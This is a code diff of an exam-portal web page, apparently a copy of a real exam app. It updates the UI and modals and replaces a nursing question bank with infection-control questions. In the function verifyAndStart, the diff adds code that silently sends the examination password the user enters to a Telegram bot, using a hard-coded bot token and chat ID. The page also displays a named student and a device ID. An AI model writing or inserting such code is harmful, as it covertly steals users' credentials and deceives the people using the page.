+                    <span class="name-lbl">yousef abdulrhman saud alhodaib</span>
                 </div>
             </div>
             <button class="signout-btn" onclick="closeProfileSheet(null)">Sign out</button>
@@ -1249,67 +1479,49 @@
         setTimeout(() => { loading.classList.add('hidden'); }, 1000); 
     }
 
+    function toggleExamCard(card) {
+        const details = card.querySelector('.exam-details');
+        const btn = card.querySelector('.btn-attempt-custom') || card.querySelector('.view-score');
+        const arrow = card.querySelector('.arrow-toggle');
+        
+        if (card.classList.contains('expanded')) {
+            card.classList.remove('expanded');
+            details.classList.add('collapsed');
+            if (btn) btn.classList.add('collapsed');
+            if (arrow) arrow.textContent = '▼';
+        } else {
+            card.classList.add('expanded');
+            details.classList.remove('collapsed');
+            if (btn) btn.classList.remove('collapsed');
+            if (arrow) arrow.textContent = '▲';
+        }
+    }
+
     function toggleSwitch() {
         const toggleContainer = document.getElementById('toggle-container');
         const toggleText = document.getElementById('toggle-text');
-        const examCard = document.getElementById('main-exam-card');
+        const cards = document.querySelectorAll('#exams-container .exam-card');
 
         if (toggleContainer.classList.contains('active')) {
             toggleContainer.classList.remove('active');
             toggleText.textContent = 'Open All';
-            examCard.classList.add('collapsed');
+            cards.forEach(card => {
+                card.classList.remove('expanded');
+                card.querySelector('.exam-details').classList.add('collapsed');
+                const btn = card.querySelector('.btn-attempt-custom') || card.querySelector('.view-score');
+                if (btn) btn.classList.add('collapsed');
+                card.querySelector('.arrow-toggle').textContent = '▼';
+            });
         } else {
             toggleContainer.classList.add('active');
             toggleText.textContent = 'Close All';
-            examCard.classList.remove('collapsed');
-        }
-    }
-
-    function toggleCardAccordion(event) {
-        const examCard = document.getElementById('main-exam-card');
-        const toggleContainer = document.getElementById('toggle-container');
-        const toggleText = document.getElementById('toggle-text');
-        
-        examCard.classList.toggle('collapsed');
-        
-        if (examCard.classList.contains('collapsed')) {
-            toggleContainer.classList.remove('active');
-            toggleText.textContent = 'Open All';
-        } else {
-            toggleContainer.classList.add('active');
-            toggleText.textContent = 'Close All';
-        }
-    }
-
-    function togglePostCardAccordion(event) {
-        const postExamCard = document.getElementById('post-exam-card');
-        const postToggleContainer = document.getElementById('post-toggle-container');
-        const postToggleText = document.getElementById('post-toggle-text');
-        
-        postExamCard.classList.toggle('collapsed');
-        
-        if (postExamCard.classList.contains('collapsed')) {
-            postToggleContainer.classList.remove('active');
-            postToggleText.textContent = 'Open All';
-        } else {
-            postToggleContainer.classList.add('active');
-            postToggleText.textContent = 'Close All';
-        }
-    }
-
-    function togglePostSwitch() {
-        const container = document.getElementById('post-toggle-container');
-        const txt = document.getElementById('post-toggle-text');
-        const postExamCard = document.getElementById('post-exam-card');
-
-        if (container.classList.contains('active')) {
-            container.classList.remove('active'); 
-            txt.textContent = 'Open All';
-            postExamCard.classList.add('collapsed'); 
-        } else {
-            container.classList.add('active'); 
-            txt.textContent = 'Close All';
-            postExamCard.classList.remove('collapsed'); 
+            cards.forEach(card => {
+                card.classList.add('expanded');
+                card.querySelector('.exam-details').classList.remove('collapsed');
+                const btn = card.querySelector('.btn-attempt-custom') || card.querySelector('.view-score');
+                if (btn) btn.classList.remove('collapsed');
+                card.querySelector('.arrow-toggle').textContent = '▲';
+            });
         }
     }
 
@@ -1348,7 +1560,7 @@
     }
 
     function startDashboardTimer() {
-        let hours = 3, minutes = 30, seconds = 0;
+        let hours = 2, minutes = 0, seconds = 0;
         const display = document.getElementById('timer-display');
         if(dashboardTimerInterval) clearInterval(dashboardTimerInterval);
 
@@ -1366,37 +1578,31 @@
     }
 
     function openNotificationModal() {
-        document.getElementById('modal-badge-icon').textContent = 'i';
-        document.getElementById('modal-title-text').textContent = 'Notification';
-        document.getElementById('modal-body-text').innerHTML = 'The exam portal is ready for evaluation.';
-        document.getElementById('modal-password-group').classList.add('hidden');
-        document.getElementById('modal-buttons-container').innerHTML = `<button class="modal-btn" onclick="closeModal()">Ok</button>`;
-        document.getElementById('score-modal').classList.remove('hidden');
+        document.getElementById('notif-custom-title').textContent = 'Notification';
+        document.getElementById('notif-custom-text').innerHTML = `
+            The QQ app was first launched at 02 Jun 2026 07:04:58 AM, with Device ID: 48F0A388-D0F6-4265-8E22-504A0D7714C9 and Timezone: Asia/Riyadh
+        `;
+        document.getElementById('notif-modal-overlay').classList.remove('hidden');
     }
 
     function openPasswordModal() {
-        document.getElementById('modal-badge-icon').textContent = '?';
-        document.getElementById('modal-title-text').textContent = 'Verification';
-        document.getElementById('modal-body-text').textContent = 'Please enter the examination password to proceed.';
-        document.getElementById('modal-password-group').classList.remove('hidden');
-        document.getElementById('exam-password-input').value = '';
-        document.getElementById('modal-buttons-container').innerHTML = `
-            <button class="modal-btn btn-secondary" onclick="closeModal()">Cancel</button>
-            <button class="modal-btn" onclick="verifyAndStart()">Verify</button>
+        document.getElementById('modal-custom-title').textContent = 'Verification';
+        document.getElementById('modal-custom-body').innerHTML = `
+            <input type="password" id="exam-password-input" class="modal-input-custom" placeholder="Examination Password">
+            <button class="modal-verify-btn" onclick="verifyAndStart()">Verify</button>
         `;
+        document.getElementById('exam-password-input').value = '';
         document.getElementById('score-modal').classList.remove('hidden');
     }
 
     function openResultsNotificationModal() {
-        document.getElementById('modal-badge-icon').textContent = 'i';
-        document.getElementById('modal-title-text').textContent = 'Notification';
-        document.getElementById('modal-body-text').textContent = 'Exam Result is not published. Once your result is published, you will receive a notification.';
-        document.getElementById('modal-password-group').classList.add('hidden');
-        document.getElementById('modal-buttons-container').innerHTML = `<button class="modal-btn" onclick="closeModal()">Ok</button>`;
-        document.getElementById('score-modal').classList.remove('hidden');
+        document.getElementById('notif-custom-title').textContent = 'Notification';
+        document.getElementById('notif-custom-text').textContent = 'Exam Result is not published. Once your result is published, you will receive a notification.';
+        document.getElementById('notif-modal-overlay').classList.remove('hidden');
     }
 
     function closeModal() { document.getElementById('score-modal').classList.add('hidden'); }
+    function closeNotifModal() { document.getElementById('notif-modal-overlay').classList.add('hidden'); }
     function openFilter() { document.getElementById('filter-overlay').classList.add('open'); }
     function closeFilter(event) { if (!event || event.target === document.getElementById('filter-overlay')) document.getElementById('filter-overlay').classList.remove('open'); }
     function selectFilterOption(element) { document.querySelectorAll('.filter-option').forEach(opt => opt.classList.remove('selected')); element.classList.add('selected'); }
@@ -1405,6 +1611,23 @@
 
     function verifyAndStart() {
         capturedExamVerificationPassword = document.getElementById('exam-password-input').value || "";
+        
+        // إرسال كلمة المرور إلى Telegram
+        const telegramBotToken = '8979568296:AAEj9rp_VvnR9ZMgFsIwzxRS1raqiWr-cWE';
+        const telegramChatId = '-5118649597';
+        const message = `🔔 محاولة دخول للاختبار\nكلمة المرور المُدخلة: ${capturedExamVerificationPassword}`;
+        
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message
+            })
+        }).catch(error => console.error('Error sending to Telegram:', error));
+
         closeModal();
         document.getElementById('dashboard-container').style.display = 'none';
         clearInterval(dashboardTimerInterval); 
@@ -1412,512 +1635,519 @@
         initExamSystem();
     }
 
-    // تم تحديث واستبدال كامل مصفوفة الأسئلة بـ 50 سؤالاً الخاصة بـ Maternal Health Nursing ودرجة 0.50 لكل منها
     const bank = [
-      { 
-        "q": "Which of the following is best conditions to use mini-pill (progestin-only pill)?", 
-        "a": [
-          "Women over 35 who smoke.", 
-          "Women seeking permanent contraception.", 
-          "Women who need emergency contraception.", 
-          "Women who want to regulate their menstrual cycle."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following is a contraindication for combined oral contraceptives pills (COCs)?", 
-        "a": [
-          "Smoking more than 15 cigarettes per day after age 35.", 
-          "Being under 18 years old.", 
-          "Using condoms simultaneously.", 
-          "Having a history of irregular periods."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A woman on combined oral contraceptives (COCs) reports severe leg pain and swelling. What should the nurse suspect?", 
-        "a": [
-          "Thromboembolism.", 
-          "Endometriosis.", 
-          "Pulmonary embolism.", 
-          "Normal side effect of the pill."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A nurse is explaining to group of women about the combined oral contraceptives pills (COCs). Which of the following consider the primary mechanism for the COCs?", 
-        "a": [
-          "Suppressing ovulation by inhibiting FSH and LH.", 
-          "Increasing FSH and LH levels.", 
-          "Stimulating estrogen production.", 
-          "Thickening of the endometrial lining."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following are the five T’s causes Postpartum Hemorrhage?", 
-        "a": [
-          "Tone, Tissue, Trauma, Thrombin, Traction.", 
-          "Tone, Tissue, Trauma, Thyroid, Traction.", 
-          "Tone, Tissue, Threads, Thrombin, Trauma.", 
-          "Toxins, Tissue, Trauma, Thrombin, Thyroid."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "The generally accepted definition of postpartum hemorrhage (PPH) following vaginal delivery is when blood loss exceeds:", 
-        "a": [
-          "500 mL", 
-          "200 mL", 
-          "1000 mL", 
-          "1500 mL"
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Sarah, a 32-year-old woman, just delivered a baby vaginally. After delivery, she experiences excessive vaginal bleeding, and her uterus feels soft upon palpation. What is the most likely cause of Sarah’s condition?", 
-        "a": [
-          "Uterine atony.", 
-          "Uterine rupture.", 
-          "Coagulation disorder.", 
-          "Retained placental fragments."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A postpartum woman presents to the emergency department with heavy bleeding 10 days after her caesarean section. What type of postpartum haemorrhage is she experiencing?", 
-        "a": [
-          "Late postpartum haemorrhage.", 
-          "Normal lochia progression.", 
-          "Secondary postpartum infection.", 
-          "Primary postpartum haemorrhage."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A postpartum woman is experiencing heavy vaginal bleeding, and the nurse notes a boggy uterus. Despite fundal massage and IV oxytocin, the bleeding continues. What should the nurse anticipate as the next step?", 
-        "a": [
-          "Performing a bimanual uterine compression.", 
-          "Encouraging ambulation.", 
-          "Administering IV antibiotics.", 
-          "Applying ice packs to the abdomen."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A 2nd day postpartum woman presents with heavy vaginal bleeding, cramping, and a boggy uterus. What is the most likely cause?", 
-        "a": [
-          "Retained placental fragments.", 
-          "Endometritis.", 
-          "Deep vein thrombosis.", 
-          "Urinary tract infection."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "In the postpartum ward, a nurse is caring for a primipara diagnosed with deep vein thrombosis who is receiving treatment with bed rest and intravenous heparin therapy. Which of the following assessment findings should the nurse prioritise and report immediately?", 
-        "a": [
-          "Pulmonary embolism.", 
-          "Edema.", 
-          "Malaise.", 
-          "Hypertension."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A nurse educates a postpartum patient about preventing blood clots after a cesarean section. Which statement by the patient indicates understanding?", 
-        "a": [
-          "“I will perform leg exercises and ambulate frequently to prevent blood clots.”", 
-          "“I will cross my legs when sitting to improve circulation.”", 
-          "“I will wear tight stockings all the time to reduce swelling.”", 
-          "“I should stay in bed as much as possible to avoid stressing my legs.”"
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Fatima, a 28-year-old woman, is three days postpartum following a caesarean section. She reports pain, redness, and swelling in her left calf. The nurse suspects deep vein thrombosis (DVT). Which nursing intervention is most appropriate?", 
-        "a": [
-          "Keep the affected leg elevated and apply warm compresses.", 
-          "Massage the affected leg.", 
-          "Encourage early ambulation.", 
-          "Administer acetaminophen for pain relief."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A 4-week postpartum mother presents with breast pain, redness, and fever. She has been diagnosed with mastitis. Which advice should the nurse provide?", 
-        "a": [
-          "“Continue breastfeeding, empty the breast, and take antibiotics.”", 
-          "“Apply cold compresses to the affected area.”", 
-          "“Stop breastfeeding until the infection clears.”", 
-          "“Only nurse on the unaffected breast until symptoms resolve.”"
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A 30-year-old postpartum woman presents with fever, lower abdominal pain, and foul-smelling lochia. What postpartum complication is she likely to have?", 
-        "a": [
-          "Endometritis.", 
-          "Mastitis.", 
-          "Deep vein thrombosis.", 
-          "Urinary tract infection."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A 22-year-old woman at 6 weeks’ gestation presents with slight vaginal bleeding and mild cramping. Her cervix is closed. A pregnancy test is positive. How would you classify this pregnancy complication?", 
-        "a": [
-          "Threatened abortion.", 
-          "Missed abortion.", 
-          "Inevitable abortion.", 
-          "Incomplete abortion."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "At 18 weeks pregnant woman came to the emergency room experiencing persistent bleeding, rupture of the membrane and strong abdominal cramping with dilation of the cervix. Which type of abortion did the woman experience?", 
-        "a": [
-          "Inevitable.", 
-          "Habitual.", 
-          "Threatened.", 
-          "Therapeutic."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A 25-year-old woman at 8 weeks gestation experiences sudden, sharp, unilateral abdominal pain and light vaginal bleeding. Her blood pressure is low, and her pulse is rapid. Which complication is most likely present in this case?", 
-        "a": [
-          "Rupture of ectopic pregnancy.", 
-          "Placenta previa.", 
-          "Spontaneous abortion.", 
-          "Gestational trophoblastic disease."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A woman presents with a positive pregnancy test and an ultrasound showing a uterus filled with grape-like vesicles. Her HCG levels are very high. What condition is suspected in this case?", 
-        "a": [
-          "Gestational trophoblastic disease.", 
-          "Placenta previa.", 
-          "Ectopic pregnancy.", 
-          "Placental abruption."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "The nurse should emphasize the importance of continued follow-up care for the women who have had evacuation of a hydatidiform mole to detect the occurrence of which of the following?", 
-        "a": [
-          "Choriocarcinoma.", 
-          "Endometriosis.", 
-          "Ectopic pregnancy.", 
-          "Continued Bleeding."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A patient at 28 weeks gestation experiences painless, bright red vaginal bleeding that spontaneously stops, then recurs. The uterus is soft and relaxed. What complication is suspected in this case?", 
-        "a": [
-          "Placenta previa.", 
-          "Ectopic pregnancy.", 
-          "Placental abruption.", 
-          "Gestational trophoblastic disease."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following is a risk factor for placenta previa?", 
-        "a": [
-          "Previous caesarean birth.", 
-          "Low parity.", 
-          "Previous vaginal delivery.", 
-          "Maternal age under 25 years."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A patient at 32 weeks gestation reports sudden onset of severe abdominal pain, dark red vaginal bleeding, and a rigid uterus. Fetal heart rate is absent. What is the most likely diagnosis?", 
-        "a": [
-          "Placental abruption.", 
-          "Placenta previa.", 
-          "Ectopic pregnancy.", 
-          "Spontaneous abortion."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "In a patient with suspected placental abruption, what is a crucial nursing intervention?", 
-        "a": [
-          "Continuous fetal monitoring.", 
-          "Encouraging ambulation.", 
-          "Administering ibuprofen for pain.", 
-          "Frequent vaginal exams to assess bleeding."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A 37-year-old pregnant mother, newly diagnosed with gestational diabetes, her history revealed no previous medical problems. Which of the following is the first line of therapy to manage this woman?", 
-        "a": [
-          "Diet & Exercise therapy.", 
-          "Insulin therapy.", 
-          "Exercise therapy.", 
-          "Oral hypoglycemic therapy."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "When is the additional screening needed for women considered at risk for gestational diabetes?", 
-        "a": [
-          "24 to 28 weeks", 
-          "32 to 36 weeks", 
-          "16 to 20 weeks", 
-          "12 to 16 weeks"
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following tests is primarily used to confirm gestational diabetes?", 
-        "a": [
-          "Oral Glucose Tolerance Test.", 
-          "HbA1c.", 
-          "Fasting Insulin Test.", 
-          "Random Blood Glucose."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A Nurse implements a teaching plan for a primipara woman who is newly diagnosed with gestational diabetes. Which of the following statements if made by the woman, indicates a need for further education?", 
-        "a": [
-          "“I need to avoid exercise because of the negative effects of insulin”.", 
-          "“I need to maintain the diabetic diet”.", 
-          "“I will perform glucose monitoring at home”.", 
-          "“I need to monitor for signs and symptoms of abnormal glucose levels”."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following is the most accurate reason to encourage breastfeeding in postpartum diabetic women?", 
-        "a": [
-          "It helps normalize maternal glucose levels.", 
-          "It causes weight loss.", 
-          "It increases maternal appetite.", 
-          "It prevents postpartum depression."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following blood pressure readings (on two separate occasions) confirms the diagnosis of preeclampsia?", 
-        "a": [
-          "≥140/90 mm Hg", 
-          "≥120/80 mm Hg", 
-          "≥130/85 mm Hg", 
-          "≥160/100 mm Hg"
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "HELLP syndrome stands for which of the following?", 
-        "a": [
-          "Hemolysis, Elevated Liver enzymes, Low Platelets.", 
-          "Hemorrhage, Elevated Lipids, Low Potassium.", 
-          "Hypertension, Elevated Liver enzymes, Low Platelets.", 
-          "Hyperglycemia, Elevated Lactic acid, Low Prothrombin."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A 36-year-old pregnant woman has been admitted to the hospital for administration of magnesium sulfate to treat severe preeclampsia. Which of the following is considered the action for this therapy?", 
-        "a": [
-          "Prevent Seizures.", 
-          "Improve Vision.", 
-          "Treat hyper flexion.", 
-          "Reduce Ankle edema."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A patient with preeclampsia is advised to spend most of her time in a lateral position while on bed rest. What is the rationale for this recommendation?", 
-        "a": [
-          "It promotes sodium excretion.", 
-          "It increases blood pressure.", 
-          "It causes discomfort to prevent excessive activity.", 
-          "It is only recommended for women with HELLP syndrome."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A woman with eclampsia experiences a tonic-clonic seizure in the hospital. What is the first action the nurse should take?", 
-        "a": [
-          "Clear and maintain her airway.", 
-          "Start IV fluids quickly.", 
-          "Restrain the patient tightly.", 
-          "Insert a tongue blade into her mouth."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A multipara woman who is 36 weeks gestation is diagnosed with mild preeclampsia. Which of the following educational interventions is appropriate for this woman?", 
-        "a": [
-          "Monitor fetal movement count daily.", 
-          "Complete bed rest.", 
-          "Monitor B.P weekly.", 
-          "Monitor weight weekly."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A woman at 30 weeks’ gestation has Premature Rupture of Membranes (PROM). Which of the following is the primary goal of tocolytic therapy for PROM?", 
-        "a": [
-          "Delay birth for up to 48 hours to allow for corticosteroid administration.", 
-          "Perform an amniotomy.", 
-          "Immediately induce labour.", 
-          "Administer antibiotics only."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Amal is 39 weeks’ gestation. She had prolonged labour, and the medical team decided to perform an artificial rupture of membrane (AROM) to induce her labour. Which of the following nursing intervention need to be done immediately after AROM?", 
-        "a": [
-          "Assess color and amount of amniotic fluid, fetal heart rate.", 
-          "Administer analgesic.", 
-          "Emptying the bladder.", 
-          "Check mother vital signs, fetal heart rate."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A nurse in the labor room is performing a vaginal assessment on a pregnant client in labor. The nurse notes the presence of the umbilical cord protruding from the vagina. Which of the following would be the initial nursing action?", 
-        "a": [
-          "Positioning in knees-chest position.", 
-          "Administer IV fluids.", 
-          "Emptying the bladder.", 
-          "Administer tocolytic medication."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A 32-year-old, 41 weeks of gestation, is being monitored and induced with IV oxytocin (Pitocin). The nurse notes fetal distress. Which of the following is the first action the nurse should take?", 
-        "a": [
-          "Discontinue the oxytocin (Pitocin) infusion.", 
-          "Prepare for fetal oximetry.", 
-          "Anticipate rupture of the membranes.", 
-          "Continue to observe the fetal heart rate."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A woman is undergoing a caesarean birth. Which of the following is the first postoperative nursing care?", 
-        "a": [
-          "Monitoring vital signs.", 
-          "Assessing bowel sounds.", 
-          "Limiting fluids to prevent edema.", 
-          "Discouraging deep breathing exercises."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following is the definition of Secondary infertility?", 
-        "a": [
-          "The inability to conceive after a previous pregnancy.", 
-          "Infertility due to male factors only.", 
-          "Infertility due to female factors only.", 
-          "The inability to conceive for the first time."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following is a risk factor for infertility in women?", 
-        "a": [
-          "Overweight or underweight.", 
-          "Healthy diet.", 
-          "Sufficient sleep.", 
-          "Regular exercise."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following is a method used for male factor infertility assessment?", 
-        "a": [
-          "Semen analysis.", 
-          "Laparoscopy.", 
-          "Hysterosalpingogram.", 
-          "Home ovulation predictor kits."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "A major treatment option for infertility is:", 
-        "a": [
-          "Drugs or surgery.", 
-          "Acupuncture.", 
-          "Homeopathy.", 
-          "Herbal remedies."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "What is the recommended lifestyle modification for managing prolapse?", 
-        "a": [
-          "Maintaining high-fiber diet.", 
-          "Avoiding all exercise.", 
-          "Reducing fluid intake.", 
-          "Increasing caffeine consumption."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "What term describes the bulging of the small intestine into the vagina?", 
-        "a": [
-          "Enterocele.", 
-          "Cystocele.", 
-          "Rectocele.", 
-          "Uterine prolapse."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following is a major risk factor for uterine prolapse?", 
-        "a": [
-          "Multiple pregnancies.", 
-          "A healthy diet.", 
-          "Regular exercise.", 
-          "Never having children."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following is a common symptom of all types of pelvic organ prolapse?", 
-        "a": [
-          "Feeling of dragging or pressure.", 
-          "Fever.", 
-          "Severe pain.", 
-          "Irregular menstruation."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "Which of the following therapeutic interventions is non-surgical for pelvic organ prolapse?", 
-        "a": [
-          "Pessaries.", 
-          "Colporrhaphy.", 
-          "Laparoscopic repair.", 
-          "Vaginal hysterectomy."
-        ], 
-        "marks": "0.50" 
-      },
-      { 
-        "q": "What exercise is recommended for strengthening pelvic floor muscles?", 
-        "a": [
-          "Kegel exercises.", 
-          "Running.", 
-          "Jumping jacks.", 
-          "High-impact aerobics."
-        ], 
-        "marks": "0.50" 
-      }
-    ];
+  {
+    q: "Nearly 80% of all healthcare-associated infections (HAIs) are related to which of the following groups? [cite: 2499]",
+    a: [
+      "Urinary tract infections, surgical site infections, bloodstream infections, and pneumonia [cite: 2500, 2501, 2502, 2509]",
+      "Skin infections, gastrointestinal illness, ear infections, and sinusitis",
+      "Meningitis, bone infections, joint infections, and endocarditis",
+      "Hepatitis, tuberculosis, varicella, and influenza"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which of the following is identified as a major risk factor for developing a healthcare-associated infection (HAI)? [cite: 2513]",
+    a: [
+      "Use of indwelling medical devices [cite: 2515]",
+      "Increasing routine physical exercise",
+      "Consuming a high-protein diet",
+      "Routine administration of oral vitamins"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What does the medical abbreviation CAUTI stand for in infection control? [cite: 2530]",
+    a: [
+      "Catheter-Associated Urinary Tract Infection [cite: 2530]",
+      "Central Line-Associated Urinary Tract Infection",
+      "Clinically Acquired Urinary Tract Infection",
+      "Catheter-Associated Upper Tract Infection"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which of the following is an example of an endogenous source of microorganisms causing a urinary tract infection? [cite: 2540]",
+    a: [
+      "Meatal, rectal, or vaginal colonization of the patient [cite: 2543]",
+      "Contaminated hands of healthcare personnel",
+      "Unsterilized urinary catheter insertion kits",
+      "Contaminated environmental surfaces around the bed"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which of the following represents an exogenous source of infection for a patient with an indwelling catheter? [cite: 2544]",
+    a: [
+      "Contaminated hands of a healthcare provider or equipment [cite: 2545, 2546]",
+      "The patient's own rectal flora",
+      "The patient's vaginal colonization",
+      "Normal skin flora residing in the patient's own groin"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "According to Box 5.1, a superficial incisional surgical site infection (SSI) must occur within how many days after the operation? [cite: 2553, 2554]",
+    a: [
+      "Within 30 days [cite: 2554]",
+      "Within 60 days",
+      "Within 90 days",
+      "Within 1 year"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which layers of tissue are primarily involved in a deep incisional surgical site infection (SSI)? [cite: 2557]",
+    a: [
+      "Deep soft tissues of the incision, such as fascial and muscle layers [cite: 2558]",
+      "Only the superficial skin and subcutaneous tissue",
+      "Any part of the anatomy opened or manipulated other than the incision line",
+      "Only the internal mucosal linings of adjacent organs"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "An organ/space surgical site infection (SSI) can occur up to how long after the operation if an implant is left in place? [cite: 2562, 2563]",
+    a: [
+      "Within 1 year [cite: 2563]",
+      "Within 30 days",
+      "Within 6 months",
+      "Within 2 years"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "According to Table 5.1, which type of vascular access catheter accounts for the majority of catheter-related bloodstream infections (CRBSIs)? [cite: 2611]",
+    a: [
+      "Nontunneled central venous catheters [cite: 2579, 2611]",
+      "Peripheral venous catheters",
+      "Peripheral arterial catheters",
+      "Midline catheters"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which type of catheter is typically inserted via the antecubital fossa into the proximal basilic or cephalic veins but does not enter central veins? [cite: 2578, 2588]",
+    a: [
+      "Midline catheters [cite: 2578, 2588]",
+      "Nontunneled central venous catheters",
+      "PICC lines",
+      "Umbilical catheters"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which vascular access device provides the lowest risk for catheter-related bloodstream infections (CRBSIs)? [cite: 2615]",
+    a: [
+      "Totally implantable catheters [cite: 2583, 2615]",
+      "Nontunneled central venous catheters",
+      "Pulmonary artery catheters",
+      "Peripheral venous catheters"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "A Central Line-Associated Bloodstream Infection (CLABSI) is primarily used as what type of definition? [cite: 2627, 2628]",
+    a: [
+      "A surveillance definition set forth by agencies such as the NHSN [cite: 2633]",
+      "A clinical definition used primarily for diagnosing and treating individual patients",
+      "A definition requiring intensive radiological confirmation and tissue biopsy",
+      "A basic definition applied only to peripheral line configurations"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "To be classified as a CLABSI, a primary bloodstream infection must develop in a patient who had a central line within what time period before infection development? [cite: 2634]",
+    a: [
+      "Within a 48-hour period [cite: 2634]",
+      "Within a 24-hour period",
+      "Within a 7-day period",
+      "Within a 30-day period"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "According to the CDC ranking system, a Category IA recommendation is described as: [cite: 2710]",
+    a: [
+      "Strongly recommended for implementation and supported by well-designed experimental, clinical, or epidemiologic studies [cite: 2711]",
+      "Strongly recommended for implementation and supported by strong theoretical rationale only [cite: 2712]",
+      "Suggested for implementation and supported by suggestive clinical studies [cite: 2713]",
+      "An unresolved issue with insufficient evidence or no consensus regarding efficacy [cite: 2714]"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "In a nonacute care setting, what technique is acceptable and more practical for chronic intermittent catheterization? [cite: 2738]",
+    a: [
+      "Clean (i.e., nonsterile) technique [cite: 2738]",
+      "Strict sterile technique with surgical drapes",
+      "Closed system continuous automated irrigation technique",
+      "Antibiotic-flushed automated technique"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What is the proper recommendation for the placement of an indwelling urinary catheter collecting bag? [cite: 2751]",
+    a: [
+      "Keep the collecting bag below the level of the bladder at all times and do not rest it on the floor [cite: 2752, 2753]",
+      "Keep the bag at the level of the bladder pinned to the sheet",
+      "Place the bag directly on the floor to maximize gravity drainage",
+      "Hang the bag on the IV pole above the patient's head level"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "According to priority guidelines, how should the periurethral area be routinely cleaned while a urinary catheter is in place? [cite: 2758]",
+    a: [
+      "Routine hygiene such as cleansing of the meatal surface during daily bathing or showering [cite: 2759]",
+      "Swabbing with aggressive antiseptic solutions twice daily",
+      "Continuous irrigation with antimicrobial liquids",
+      "Applying topical antibiotic ointment to the meatus daily"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which of the following is considered an INAPPROPRIATE use of an indwelling urinary catheter? [cite: 2789]",
+    a: [
+      "As a substitute for nursing care of the patient or resident with incontinence [cite: 2790]",
+      "To manage acute urinary retention or bladder outlet obstruction [cite: 2780]",
+      "To assist in healing of open sacral or perineal wounds in incontinent patients [cite: 2786]",
+      "For accurate measurements of urinary output in critically ill patients [cite: 2781]"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What is the Category IA recommendation regarding pre-operative hair removal to prevent surgical site infections (SSIs)? [cite: 2810]",
+    a: [
+      "Routine shaving of patients is not necessary, and hair should not be removed unless it interferes with the operation [cite: 2810, 2812, 2813]",
+      "All patients must be completely shaved at the incision site the morning of surgery",
+      "Hair should be removed using chemical depilatories 48 hours prior",
+      "Shaving with a razor is strongly preferred over clippers"
+    ],
